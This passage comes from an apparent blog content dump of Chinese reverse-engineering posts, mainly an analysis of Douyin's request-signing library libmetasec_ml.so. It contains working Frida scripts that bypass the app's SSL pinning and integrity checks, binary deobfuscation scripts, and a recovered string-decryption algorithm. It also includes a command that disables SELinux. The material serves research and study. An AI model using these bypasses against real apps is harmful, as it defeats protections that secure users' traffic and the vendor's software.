ButtonGroupTypefrom com.pnfsoftware.jeb.core import RuntimeProjectUtilfrom com.pnfsoftware.jeb.core.units.code.java import IJavaSourceUnitfrom com.pnfsoftware.jeb.core.units.code import ICodeUnit, ICodeItemfrom com.pnfsoftware.jeb.core.output.text import ITextDocumentfrom com.pnfsoftware.jeb.core.units.code.java import IJavaAssignment, IJavaSourceUnit, IJavaStaticField, IJavaNewArray, IJavaConstant, IJavaCall, IJavaField, IJavaMethod, IJavaClassfrom com.pnfsoftware.jeb.core.events import JebEvent, Jfrom com.pnfsoftware.jeb.core.util import DecompilerHelperfrom com.pnfsoftware.jeb.util.net import Netimport json# 解密字符串函数的类名以及方法名methodName = ['Lcom/test/Activity;', 'bc']class dec_str_test(IScript): def run(self, ctx): print('start deal with strings') self.ctx = ctx engctx = ctx.getEnginesContext() if not engctx: print('Back-end engines not initialized') return projects = engctx.getProjects() if not projects: print('There is no opened project') return units = RuntimeProjectUtil.findUnitsByType(projects[0], IJavaSourceUnit, False) for unit in units: javaClass = unit.getClassElement() print('[+] decrypt:' + javaClass.getName()) self.cstbuilder = unit.getFactories().getConstantFactory() #self.elebuilder = unit.getFactories().getElementFactory() self.processClass(javaClass) unit.notifyListeners(JebEvent(J.UnitChange)) print('Done.') def processClass(self, javaClass): # if javaClass.getName() == methodName[0]: # return for method in javaClass.getMethods(): block = method.getBody() i = 0 while i &lt; block.size(): stm = block.get(i) self.checkElement(block, stm) i += 1 def checkElement(self, parent, e): try: if isinstance(e, IJavaCall): mmethod = e.getMethod() mname = mmethod.getName() msig = mmethod.getSignature() if mname == methodName[1] and methodName[0] in msig: v = [] args = e.getArguments(); decstr = self.bc_decryptstring(args[0],args[1],args[2],args[3]) if decstr: print(e) print(\"decrypt bc->\",decstr) parent.replaceSubElement(e, self.cstbuilder.createString(decstr)) for subelt in e.getSubElements(): if isinstance(subelt, IJavaClass) or isinstance(subelt, IJavaField) or isinstance(subelt, IJavaMethod): continue self.checkElement(e, subelt) except Exception,e: print(e) def read_array(self,arr): if arr.getType()==None: return None res = [] arr = arr.getInitialValues() for i in range(len(arr)): res.append(arr[i].getByte()) return res def bc_decryptstring(self, args1,args2,args3,args4): argv1= self.read_array(args1) argv2 = self.read_array(args2) argv3 = args3.getInt() argv4 = self.read_array(args4) body = &#123; 'method':'bc', 'argv1':argv1, 'argv2':argv2, 'argv3':argv3, 'argv4':argv4 &#125; r = Net().query(\"http://127.0.0.1:8080/strdec\", &#123;\"body\":str(body)&#125;) return r","categories":[],"tags":[]},{"title":"初探抖音六神之字符串解密算法分析","slug":"douyin-6shen-init","date":"2024-08-20T13:52:00.000Z","updated":"2025-04-08T18:55:11.505Z","comments":true,"path":"douyin-6shen-init/","link":"","permalink":"https://oacia.dev/douyin-6shen-init/","excerpt":"","text":"# 前言 抖音六神算法，一听这名字就超 cooool 的，正好最近也没有什么别的事情，于是就趁着周末来逆一逆抖音 APP, 在分析六神算法的过程中，它的 java 层的字符串加密算法我感觉很有意思，于是就写了这篇文章来记录一下～ 本文所分析的抖音版本为 300600 # ssl pinning 绕过 打开 app 之后用 repable 抓包，抖音直接显示无网络，所以想都不用想，肯定是有 ssl pinning，但是常规的过 ssl pinning 的代码没有用，因为抖音和其他 app 不一样，它的 ssl 校验是在 native 层的 hook apk 打开的 so 库，一般网络库的加载都是在最前面的，在 libsscronet.so 找到 ssl 相关的函数 这一块应该是在 so 中用自定义的函数去进行 ssl 的验证 搜索字符串发现有很多 certificate , 那大概率就是在这个 so 里面进行 ssl pinning 的 看了一下导入函数，感觉 SSL_CTX_set_custom_verify 有点像校验的样子 SSL_CTX_set_custom_verify 证书校验异步操作，相比 OpenSSL，BoringSSL 单独将认证证书的流程拿出来从而提供更详细的认证控制 再细看一下这个函数 void SSL_CTX_set_custom_verify( SSL_CTX *ctx, int mode, enum ssl_verify_result_t (*callback)(SSL *ssl, uint8_t *out_alert)) &#123; ctx->verify_mode = mode; ctx->custom_verify_callback = callback;&#125;其中的 mode 用来验证客户端，mode 的值为 1 进行验证，但是如果取 0 就是不验证 // SSL_VERIFY_NONE, on a client, verifies the server certificate but does not// make errors fatal. The result may be checked with |SSL_get_verify_result|. On// a server it does not request a client certificate. This is the default.#define SSL_VERIFY_NONE 0x00// SSL_VERIFY_PEER, on a client, makes server certificate errors fatal. On a// server it requests a client certificate and makes errors fatal. However,// anonymous clients are still allowed. See// |SSL_VERIFY_FAIL_IF_NO_PEER_CERT|.#define SSL_VERIFY_PEER 0x01// SSL_VERIFY_FAIL_IF_NO_PEER_CERT configures a server to reject connections if// the client declines to send a certificate. This flag must be used together// with |SSL_VERIFY_PEER|, otherwise it won't work.#define SSL_VERIFY_FAIL_IF_NO_PEER_CERT 0x02// SSL_VERIFY_PEER_IF_NO_OBC configures a server to request a client certificate// if and only if Channel ID is not negotiated.#define SSL_VERIFY_PEER_IF_NO_OBC 0x04所以我们可以直接用 frida patch 第二个参数的值为 0 function hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); //console.log('load ',path); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; ssl_bypass(); //do your own code &#125; &#125; &#125; );&#125;function ssl_bypass()&#123; let SSL_CTX_set_custom_verify = Module.getExportByName('libsscronet.so', 'SSL_CTX_set_custom_verify'); console.log('start hook SSL_CTX_set_custom_verify') if (SSL_CTX_set_custom_verify != null) &#123; Interceptor.attach(SSL_CTX_set_custom_verify, &#123; onEnter: function (args) &#123; console.log('SSL_CTX_set_custom_verify mode: ',args[1]); args[1] = ptr(0); console.log('patch mode from 1 to 0 to bypass ssl') &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125;&#125;//frida -H 127.0.0.1:1234 -l .\\douyin\\hook.js -f com.ss.android.ugc.awemesetImmediate(hook_dlopen, \"libsscronet.so\")抓到包啦 在请求头中出现的六个 x- 带头的参数就是六神算法 # 定位参数位置 接下来就是去定位这些参数的位置咯，该怎么定位呢？ 其实很简单，按照正向安全开发的经验来说，对于大型的 APP, 这种关键参数所涉及的算法基本上是不可能在 java 层中出现的，他们通常极大概率是把加密算法下沉到 native 层中去调用，所以说，我们就只需要找 so 就可以啦，而这种含有关键算法的 so 一般都有一个共性，就是 so 中不会出现静态注册的 java 方法，并且 so 被混淆的非常滴厉害，各种花指令寄存器跳转啥的通通来一遍让我们一打开 IDA 反编译连伪代码都看不了，找到这类 so，那就离关键算法不远了，而其他无关紧要的 so 基本不会做防护，要是也加上高强度的混淆，可能会出 bug 不说，还会拖慢 APP 启动速度影响用户体验 而小型的 APP, 由于很少会在安全上花功夫，所以说我们在 java 层中搜索参数名称，一般就可以找到参数所在的位置了 而在之前我们已经知道进行 ssl pinning 的 so 库的名称是 libsscronet.so , 那对参数进行加密的 so 库一般就在网络库的附近加载，感觉 libmetasec_ml.so 这个 so 挺像的 一用 IDA 反编译 so 之后引入眼帘的就是让人感到亲切的 BR 寄存器跳转！ 接下来看看这个 so 动态注册了什么方法咯 function getModuleInfoByPtr(fnPtr) &#123; var modules = Process.enumerateModules(); var modname = null, base = null; modules.forEach(function (mod) &#123; if (mod.base &lt;= fnPtr &amp;&amp; fnPtr.toInt32() &lt;= mod.base.toInt32() + mod.size) &#123; modname = mod.name; base = mod.base; return false; &#125; &#125;); return [modname, base];&#125;function hook_registNatives() &#123; var env = Java.vm.getEnv(); var handlePointer = env.handle.readPointer(); console.log(\"handle: \" + handlePointer); var nativePointer = handlePointer.add(215 * Process.pointerSize).readPointer(); console.log(\"register: \" + nativePointer); /** typedef struct &#123; const char* name; const char* signature; void* fnPtr; &#125; JNINativeMethod; jint RegisterNatives(JNIEnv* env, jclass clazz, const JNINativeMethod* methods, jint nMethods) */ Interceptor.attach(nativePointer, &#123; onEnter: function onEnter(args) &#123; var env = Java.vm.getEnv(); var p_size = Process.pointerSize; var methods = args[2]; var methodcount = args[3].toInt32(); var name = env.getClassName(args[1]); console.log(\"==== class: \" + name + \" ====\"); console.log(\"==== methods: \" + methods + \" nMethods: \" + methodcount + \" ====\"); for (var i = 0; i &lt; methodcount; i++) &#123; var idx = i * p_size * 3; var fnPtr = methods.add(idx + p_size * 2).readPointer(); var infoArr = getModuleInfoByPtr(fnPtr); var modulename = infoArr[0]; var modulebase = infoArr[1]; var logstr = \"name: \" + methods.add(idx).readPointer().readCString() + \", signature: \" + methods.add(idx + p_size).readPointer().readCString() + \", fnPtr: \" + fnPtr + \", modulename: \" + modulename + \" -> base: \" + modulebase; if (null != modulebase) &#123; logstr += \", offset: \" + fnPtr.sub(modulebase); &#125; console.log(logstr); &#125; &#125; &#125;);&#125;这里注册了 ms.bd.c.l.a , 它的方法签名是 (IIJLjava/lang/String;Ljava/lang/Object;)Ljava/lang/Object; , 并且在 so 中的偏移是 0x126e30 直接对偏移 0x126e30 的传入传出参数进行 hook, 发现就是六神算法的生成位置～ 而在对 ms.bd.c.l.a 进行交叉引用后发现，这个 native 函数还有一个字符串加密的功能如图所示，通过调用 l.a 函数，并传入 code 为 0x1000001 来实现 java 层的字符串加密，接下来我们来对这个字符串加密算法进行更加深入的研究 # libmetasec_ml.so 反混淆 这个 so 的花指令主要有五类 (其实还有一类是 CSEL-BR 寄存器跳转混淆，但是由于字符串解密算法不涉及 CSEL-BR 混淆，所以此处没有给出相关的示例) BL-BR 寄存器跳转 这个寄存器跳转简单读一下汇编就可以很清楚的知道是怎么实现的啦，主要是通过一个函数获取到了当前 BL 指令下一行的内存地址，然后通过加上一个偏移使用 BR 寄存器跳转的形式跳过去，所以我们只要把中间越过的指令直接 NOP 掉就好啦 B.GT-CBNZ 垃圾指令 这里出现了一大段 IDA 无法解析的指令 其实对于此处的汇编来说，它执行后最终的值是固定的 MOV W8, #0x1B5MOV W9, #0x16FSTR W8, [SP,#0x4C]STR W9, [SP,#0x48]LDR W8, [SP,#0x4C]LDR W9, [SP,#0x48]CMP W9, #0x4C ; 'L'B.GT MOV W9, #1MADD W8, W8, W8, W9MOV W9, #7UDIV W9, W8, W9SUB W9, W9, W9,LSL#3ADD W8, W8, W9CBNZ W8, loc_55318我们可以使用 unicorn 将这段汇编运行一下看看具体的值 # code for test-fla.elffrom unicorn import *from unicorn.arm64_const import *from keystone import * # pip install keystone-enginefrom capstone import * # pip install capstoneBASE = 0x0CODE = BASE + 0x0CODE_SIZE = 0x100000STACK = 0x7F00000000STACK_SIZE = 0x100000FS = 0x7FF0000000FS_SIZE = 0x100000ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) # 汇编引擎uc = Uc(UC_ARCH_ARM64, UC_MODE_LITTLE_ENDIAN) # 模拟执行引擎cs = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN) # 反汇编引擎def hook_code(uc: unicorn.Uc, address, size, user_data): # print(hex(address)) for i in cs.disasm(CODE_DATA[address - BASE:address - BASE + size], address): # arm 架构是 NZCV 寄存器，32 位的寄存器最左边开始的四位依次存储 N,Z,C,V 标志 ZF_flag = (uc.reg_read(UC_ARM64_REG_NZCV) >>30)&amp;1 if i.mnemonic == \"b.gt\": print(f\"0x&#123;i.address&#125;: &#123;i.mnemonic&#125; &#123;i.op_str&#125; ; ZF = &#123;ZF_flag&#125;\") uc.reg_write(UC_ARM64_REG_PC, address + size) elif i.mnemonic == \"cmp\": w9 = uc.reg_read(UC_ARM64_REG_W9) print(f\"0x&#123;i.address&#125;: &#123;i.mnemonic&#125; &#123;i.op_str&#125; ; ZF = &#123;ZF_flag&#125;, w9 = &#123;hex(w9)&#125;\") elif i.mnemonic == \"cbnz\": w8 = uc.reg_read(UC_ARM64_REG_W8) print(f\"0x&#123;i.address&#125;: &#123;i.mnemonic&#125; &#123;i.op_str&#125; ; ZF = &#123;ZF_flag&#125;, w8 = &#123;hex(w8)&#125;\") uc.reg_write(UC_ARM64_REG_PC, address + size) else: print(f\"0x&#123;i.address&#125;: &#123;i.mnemonic&#125; &#123;i.op_str&#125; ; ZF = &#123;ZF_flag&#125;\")def hook_mem_access(uc: unicorn.Uc, type, address, size, value, userdata): pc = uc.reg_read(UC_ARM64_REG_PC) # UC_ARM64_REG_PC print('pc:%x type:%d addr:%x size:%x' % (pc, type, address, size)) # uc.emu_stop() return Truedef inituc(uc): uc.mem_map(CODE, CODE_SIZE, UC_PROT_ALL) uc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL) uc.mem_write(CODE, CODE_DATA) uc.reg_write(UC_ARM64_REG_SP, STACK + 0x1000) uc.hook_add(UC_HOOK_CODE, hook_code) uc.hook_add(UC_HOOK_MEM_UNMAPPED | UC_HOOK_INTR, hook_mem_access)shellcode = '''MOV W8, #0x1B5MOV W9, #0x16FSTR W8, [SP,#0x4C]STR W9, [SP,#0x48]LDR W8, [SP,#0x4C]LDR W9, [SP,#0x48]CMP W9, #0x4CB.GT #0x55318MOV W9, #1MADD W8, W8, W8, W9MOV W9, #7UDIV W9, W8, W9SUB W9, W9, W9,LSL#3ADD W8, W8, W9CBNZ W8, #0x55318'''CODE_DATA,count = ks.asm(shellcode)CODE_DATA = bytes(CODE_DATA)inituc(uc)try: uc.emu_start(0x0, len(CODE_DATA))except Exception as e: print(e)输出如下，可以发现 cmp w9, #0x4c 将 ZF 标志位置为 1, b.gt 大于跳转永远成立， cbnz 跳转也永远成立，也就是不管怎么样，最终都会越过中间这段无用的指令，而跳转到 0x55318 的位置 0x0: mov w8, #0x1b5 ; ZF = 10x4: mov w9, #0x16f ; ZF = 10x8: str w8, [sp, #0x4c] ; ZF = 10x12: str w9, [sp, #0x48] ; ZF = 10x16: ldr w8, [sp, #0x4c] ; ZF = 10x20: ldr w9, [sp, #0x48] ; ZF = 10x24: cmp w9, #0x4c ; ZF = 1, w9 = 0x16f0x28: b.gt #0x55318 ; ZF = 00x32: mov w9, #1 ; ZF = 00x36: madd w8, w8, w8, w9 ; ZF = 00x40: mov w9, #7 ; ZF = 00x44: udiv w9, w8, w9 ; ZF = 00x48: sub w9, w9, w9, lsl #3 ; ZF = 00x52: add w8, w8, w9 ; ZF = 00x56: cbnz w8, #0x55318 ; ZF = 0, w8 = 0x3所以对于这种 ida 无法识别的无用指令，我们直接 nop 掉即可 F1 F6 77 FF 1F 20 03 D5 1F 20 03 D5 1F 20 03 D5 , 这个花指令主要是用来进行 so 完整性校验的，但是我们主要是进行静态分析，所以对于影响我们看汇编的指令，直接 nop 掉 EB FF 1F D6 01 00 00 D4 , 这个被 ida 解析成了 svc 调用，实际上看看上下文根本没有给 x8 赋值的语句，所以这八字节也是花指令 01 00 00 D4 DE 01 70 47 , 同样的，这里出现的 svc 也不是真的 svc, 是花指令，直接 patch 掉就好啦 所以最终的去花代码如下 import ida_segmentimport idautilsimport idcimport ida_bytesfrom keystone import *def patch_nop(begin, end): # arm64 中的 NOP 指令是 b'\\x1F\\x20\\x03\\xD5' while end > begin: ida_bytes.patch_bytes(begin, b'\\x1F\\x20\\x03\\xD5') begin = begin + 4 # 获取 text 段的起始地址text_seg = ida_segment.get_segm_by_name(\".text\")start, end = text_seg.start_ea, text_seg.end_ea#start,end = 0x533A4,0x533E0#BL-BR 结构寄存器跳转单个情况测试#start,end = 0x55288,0x55318#B.GT-CBNZ 跳转 垃圾指令测试#start,end = 0x94048,0x94070#B.GT-CBNZ 跳转 垃圾指令测试 1#去除花指令pattern = [\"01 00 00 D4 DE 01 70 47\", \"EB FF 1F D6 01 00 00 D4\", \"F1 F6 77 FF 1F 20 03 D5 1F 20 03 D5 1F 20 03 D5\"]for i in range(len(pattern)): cur_addr = start end_addr = end while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, idc.SEARCH_DOWN, pattern[i]) if cur_addr == idc.BADADDR: break else: print(\"patch flower code: \" + hex(cur_addr)) # 打印提示信息 #patch_nop(cur_addr, cur_addr + len(pattern[i].split(' '))) cur_addr = idc.next_head(cur_addr)current_addr = startwhile current_addr &lt; end: # BL-BR 结构寄存器跳转 if idc.print_insn_mnem(current_addr) == \"BR\": BR_addr = current_addr BL_addr,nop_count = 0,0 temp_addr = current_addr for _ in range(4): if idc.print_insn_mnem(temp_addr) == \"BL\": BL_addr = temp_addr elif idc.print_insn_mnem(temp_addr) == \"ADD\": nop_count = idc.get_operand_value(temp_addr, 2) temp_addr = idc.prev_head(temp_addr) if BL_addr and nop_count: print(f\"patch BL-BR from &#123;hex(BL_addr)&#125; to &#123;hex(idc.next_head(BL_addr)+nop_count)&#125;\") patch_nop(BL_addr, idc.next_head(BL_addr) + nop_count) #B.GT-CBNZ 跳转 elif idc.print_insn_mnem(current_addr) == \"CBNZ\": CBNZ_addr = current_addr CBNZ_jmp_addr = idc.get_operand_value(current_addr,1) BGT_addr = 0 temp_addr = current_addr for _ in range(10): if idc.print_insn_mnem(temp_addr) == \"B.GT\": BGT_jmp_addr = idc.get_operand_value(temp_addr,0) if CBNZ_jmp_addr==BGT_jmp_addr: print(f\"patch B.GT-CBNZ junk code from &#123;hex(CBNZ_addr+4)&#125; to &#123;hex(CBNZ_jmp_addr)&#125;\") patch_nop(CBNZ_addr+4, CBNZ_jmp_addr) break temp_addr = idc.prev_head(temp_addr) current_addr = idc.next_head(current_addr)# 自加载 libmetasec_ml.so 为了防止其他的 so 对我们的干扰，所以可以写个 demo 加载这个 so，但一加载这个 so 的时候程序就崩溃了并留下了下面这一串报错，既然调用了这个类 com.bytedance.mobsec.metasec.ml.MS ，那肯定和算法有些许的联系 而这个 MS 类，他继承了 e0 类 而这个 e0 类，他又继承了 ms.bd.c.l 这个类，这个类就是 libmetasec_ml.so 唯一动态注册的函数 a 所在的类，在 e0 中，又定义了四个函数，但是他们的函数竟然啥内容都没有 package ms.bd.c;import com.bytedance.covode.number.Covode;public class e0 extends l &#123; static &#123; Covode.recordClassIndex(1018605); &#125; private static final void Bill() &#123; &#125; public strictfp void Francies() &#123; &#125; public static final void Louis() &#123; &#125; public static final void Zeoy() &#123; &#125;&#125;把缺少的类补上去之后，随便调用一个字符串加密的函数 Log.d(TAG,(String)l.a(0x1000001, 0, 0L, \"d8044a\", new byte[]&#123;0x30, 41, 3, 72, 10, 0x72, 39, 27, 100, 97, 0x7B, 0x7A, 81, 69, 12, 0x7F, 0x74, 13, 100, 0x76, 59&#125;));没想到竟然输出了乱码 为什么调用本来的字符串加密算法不能正常输出解密之后的字符串呢？ 我思考了一下有以下几种可能的情况存在 包名 / 签名校验：然而我 hook 了一圈都没找到相关的函数，包名改成和抖音一样的还是不行 异常环境检测：但是我放到正常的手机上，log 输出的还是同样的结果 检查 / 读取特定的文件：难道是检查 app 私有目录下有没有特定的文件，如果有特定的文件，就给解密的算法赋值正确的密钥？ 利用 binder 或者 socket 和其他的进程通讯来获取初始密钥？ 下面是我对第三种情况读取文件的排查过程，因为考虑到最安全的调用系统函数的方式是 svc 调用 # SVC 调用 svc 的各个 code 对应的含义可以在此处找到 ida 搜索 svc 特征汇编 01 00 00 D4 找到如下位置，在 sub_13E274 中 对这个函数 hook 一下 function hook_svc() &#123; var module = Process.findModuleByName(\"libmetasec_ml.so\") Interceptor.attach(module.base.add(0x13E274), &#123; onEnter: function (args) &#123; console.log('hook svc code->',this.context.x8.toInt32()); &#125;, onLeave: function (retval) &#123; &#125; &#125; );&#125;但是却崩溃了？ 用 frida 打个内存读写的断点看看 function memory_read_hook()&#123; var module = Process.findModuleByName(\"libmetasec_ml.so\") MemoryAccessMonitor.enable( &#123; base:module.base.add(0x13E274), size:48 &#125;,&#123; onAccess: function (details) &#123; console.log(details.operation) console.log(get_addr_in_so(details.from)); &#125; &#125; )&#125;function get_addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; return addr.toString(16)+\" is in \"+process_Obj_Module_Arr[i].name+\" offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16); &#125; &#125; return addr.toString(16);&#125;需要注意的是我们需要在对 svc 的 hook 完成之后，延迟三秒在打内存读写断点 frida 打印出了如下日志随后进程退出 跳转到 0x13e030 看看，看来是对 svc 函数的完整性做了校验来防 hook 那就对这个函数进行 hook 把校验的值强制改成 0x312768B , 没想到又崩溃了，但是打印的地址还是和先前相同，因为 frida MemoryAccessMonitor 自身的限制，只在第一次访问内存页的时候产生回调，后续的访问就不显示了，这个特性在 frida 的官方文档中有所提及 接下来考虑打个硬件断点看看 stackplz 打硬件断点 ./stackplz --rpc --stackhook 代码如下 function log(msg) &#123; console.log(`$&#123;msg&#125;`);&#125;async function SetHWBrk(brk_addr, brk_type) &#123; try &#123; let size_len = 4; let brk_options = &#123; // brk_pid: Process.id, brk_pid: -1, brk_len: 4, brk_type: brk_type, brk_addr: brk_addr, &#125;; // open conn log(`[SetHWBrk] open conn`); // stackplz --rpc-path var conn = await Socket.connect(&#123; family: \"ipv4\", host: \"localhost\", port: 41718, &#125;); let payload = JSON.stringify(brk_options); log(`brk_options -> $&#123;payload&#125;`); let msg_len = payload.length; // send payload size let size_buffer = Memory.alloc(size_len); size_buffer.writeU32(msg_len); await conn.output.writeAll(size_buffer.readByteArray(size_len)); // send payload let payload_buffer = Memory.alloc(payload.length); payload_buffer.writeUtf8String(payload); await conn.output.writeAll(payload_buffer.readByteArray(payload.length)); // try read resp size let resp_size_buffer = await conn.input.readAll(size_len); let resp_size = resp_size_buffer.unwrap().readU32(); let resp = await conn.input.readAll(resp_size); log(`resp -> $&#123;hexdump(resp)&#125;`); // close conn await conn.close(); &#125; catch (error) &#123; log(`[SetHWBrk] error $&#123;error&#125;`); &#125;&#125;function do_hw_brk() &#123; // modify here try &#123; let lib = Process.getModuleByName(\"libmetasec_ml.so\"); SetHWBrk(lib.base.add(0x13E274), \"r\"); &#125; catch (error) &#123; log(`error $&#123;error&#125;`); &#125;&#125;遇到这个 unable to create socket: Operation not permitted , 这是由于测试的 demo 没有给网络权限所以不能建立 socket 在 AndroidManifest.xml 里面加上这个权限就可以了 &lt;uses-permission android:name=\"android.permission.INTERNET\"/>但是貌似 hit 不到， 0x23c00 跳转过去是空的并没有代码 使用 rwprocmem33 打硬件断点，发现硬件断点命中了上千万次，而检测点的偏移计算出来是 0x13e0e8 这个检测点就是我们先前去除垃圾指令后看到的这个函数 这不是和我们之前用 frida 的 MemoryAccessMonitor 找到的监测点一模一样吗，那为啥下面这个脚本没办法过检测呢？直接把 checksum 修改成和正确的值 0x312768B 一样不应该行得通的嘛 function bypass_svc_func_check() &#123; var module = Process.findModuleByName(\"libmetasec_ml.so\") Interceptor.attach(module.base.add(0x13E10C), &#123; onEnter: function (args) &#123; console.log('internal svc func check bypass, x8 ',this.context.x8,'-> 0x312768B'); this.context.x8 = 0x312768B; &#125;, onLeave: function (retval) &#123; &#125; &#125; );&#125;但是我们想想，rwprocmem33 打印出来的硬件断点，命中次数达到了上千万次，那么这绝对是另外起了一个线程来专门对这个地方做检测的 所以这个检测线程既然如此暴力，那么我们索性也一不做二不休，直接把检测的汇编暴力 patch 了不就好了！ 具体代码如下，使用 Memory.protect 将这个 so 设为 rwx , 然后直接修改内存，把 B.NE 跳转改为 B 跳转 这样这个 so 不管起多少线程，其内部线程的执行逻辑都将以我们期望的方式运行 function bypass_svc_func_check() &#123; var libso = Process.getModuleByName(\"libmetasec_ml.so\"); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); Memory.protect(ptr(libso.base), libso.size, 'rwx'); Memory.writeByteArray(ptr(libso.base).add(0x13E110),[0X03, 0X00, 0X00, 0X14]);&#125;终于我们也是成功的 hook 到了 svc 的调用码 各个 svc code 的含义如下 hook svc code-> 56(__NR_openat) open /proc/self/exehook svc code-> 62(__NR3264_lseek)hook svc code-> 63(__NR_read)hook svc code-> 57(__NR_close)hook svc code-> 135(__NR_rt_sigprocmask)hook svc code-> 172(__NR_getpid)hook svc code-> 178(__NR_gettid)hook svc code-> 135(__NR_rt_sigprocmask)但是感觉没有 open 什么有意义的文件的样子… # svc 函数 hook 检测的 bug 但是这个检测是有 bug 的，其实这个点我其实在最初就发现了，但是本着严谨的态度于是就顺着这段检测代码想要的方式去过检测 回到检测函数我们看到这个检测函数对 sub_13E274 的 12 行汇编进行完整性检测 但是被检查的函数，可是有 13 行的，所以我们直接对 RET 这行所在的地址进行 hook, 别的什么都不用做就可以成功的绕过完整性检测～ # 字符串解密算法分析 那么如何才能成功的输出解密后的字符串呢？我又回去看了看 hook ms.bd.c.l.a 函数之后打印出来的日志，于是想着去调用最初的几个字符串参数去看看情况 没想到 .ms 和 .md 一起调用的时候， com.bytedance.ttnet.TTNetInit 可以正常输出 而单独调用 com.bytedance.ttnet.TTNetInit 输出的却是乱码 那先调用 .ms 和 .md , 再调用之前解密出乱码的那个密文？ 这次字符串被成功的解密出来了！ 所以这个加密算法也很明了了，前两次被解密的字符串初始化了密钥，他们和后续字符串解密算法所使用的密钥有所关联的 现在我们用 jnitrace 去 trace 一下解密 .ms 时的 JNI 调用 jnitrace -l libmetasec_ml.so -b fuzzy com.ss.android.ugc.awemea在 0x128b24 的位置读取了传入的字符串密钥和密文，它所在的函数名为 sub_128AAC 在 0x5664c 的位置是出现了被解密的字符串，它所在的函数名为 sub_5611C 进入 sub_128B88 后我们发现，实际上在 sub_5611C 最后调用的 sub_128B88 才是 NewStringUTF 的位置 接下来我们在读取输入的函数 sub_128AAC 打印一下堆栈，来看看究竟是什么函数调用了他们 结果如下，堆栈回溯的地址都指向了 sub_5611C 在这个函数中，初始密钥为 0x71,0x62,0x13,0x14,0x5f,0x77,0x63,0x41,0x31,0x30 , 随后做了读取 str 密钥，密文的操作，并将初始密钥与传入的密钥循环异或生成二次密钥 随后二次密钥与密文循环异或实现解密，但是如果没有没有实现字符串解密的两次初始化 .ms 和 .md 的话，将会对解密后的数组再次异或密钥，并异或 0x55, 通过这种方式来隐去密钥的相关特征 所以最终的字符串解密算法如下～ #code: 0x1000001def douyin_str_dec(key: str, enc: list): init_key = [0x71, 0x62, 0x13, 0x14, 0x5f, 0x77, 0x63, 0x41, 0x31, 0x30] key = [ord(key[i % len(key)]) ^ init_key[i] for i in range(len(init_key))] ret = [enc[i] ^ key[i % len(key)] for i in range(len(enc))] return bytes(ret).decode()# com.bytedance.ttnet.TTNetInitprint(douyin_str_dec(\"976bf9\", [43, 58, 72, 88, 91, 55, 46, 19, 99, 51, 38, 54, 64, 88, 77, 58, 52, 19, 115, 124, 28,1, 107, 19, 77, 7, 52, 31, 115]))","categories":[],"tags":[]},{"title":"frida inline hook原理分析及实践","slug":"frida-inline-hook","date":"2024-08-12T19:11:00.000Z","updated":"2025-04-08T18:55:11.553Z","comments":true,"path":"frida-inline-hook/","link":"","permalink":"https://oacia.dev/frida-inline-hook/","excerpt":"","text":"# 前言 最近需要对一个固件的 arm64 linux 系统中的一个进程进行 inline hook, 然而当把 frida-inject 上传上去之后运行却发现，由于 linux 版本为 4.4 有些古老了，并且比正常的 linux 缺了一些文件，导致 frida 一运行就报错退出，所以就想着能不能自己去实现一个 inline hook. 但在这之前我们得先知道原理才行～如果想知道 inline hook 的原理是什么样子的，我认为最好的办法就是直接去看看 hook 之后的代码变成了什么样子，用调试的方法研究 frida 实现 inline hook 的具体实现 首先我们对一个测试 apk 注入下面的脚本实现 hook function hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; //do your own code hook_native() &#125; &#125; &#125; );&#125;function hook_native()&#123; var module = Process.findModuleByName(\"liboacia.so\"); Interceptor.attach(module.base.add(0x10B0), &#123; onEnter: function (args) &#123; console.log(\"hook test apk at \",module.base.add(0x10B0)) console.log(\"pid = \",Process.getCurrentThreadId()) console.log(this.context.x0) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;setImmediate(hook_dlopen, \"liboacia.so\")oriole:/ # /data/local/tmp/fs16.3.3 &amp;frida -U -l .\\hook.js -f com.oacia.apk_protect被 hook 的代码如图所示 注入完成之后，我们使用 lldb 去调试看看 # lldb 动态调试 先到 ndk\\26.1.10909125\\toolchains\\llvm\\prebuilt\\windows-x86_64\\lib\\clang\\17\\lib\\linux\\aarch64 把 lldb-server 推送到手机上 adb push .\\lldb-server /data/local/tmp随后在手机上启动 lldb-server ./lldb-server platform --server --listen unix-abstract:///data/local/tmp/debug.sock &amp;然后找到 ndk\\26.1.10909125\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin\\lldb.cmd , 运行这个 cmd .\\lldb.cmd进入后设置要连接的类型为 remote-android platform select remote-android 然后连接安卓中的 lldb-server platform connect unix-abstract-connect:///data/local/tmp/debug.sock 使用 platform status 查看是否已经连接 之后 attach 到指定的包名上 process attach -p [pid]error: attach failed: Connection shut down... 我在使用 lldb 的过程中出现了这个报错 (lldb) process attach -p 32883error: attach failed: Connection shut down by remote side while waiting for reply to initial handshake packet网上都说是开了 SELinux 的问题，我把 SELinux 临时设置为 0 还是没有解决这个 error oriole:/data/local/tmp # setenforce 0oriole:/data/local/tmp # getenforce Permissive没办法，只能用 logcat 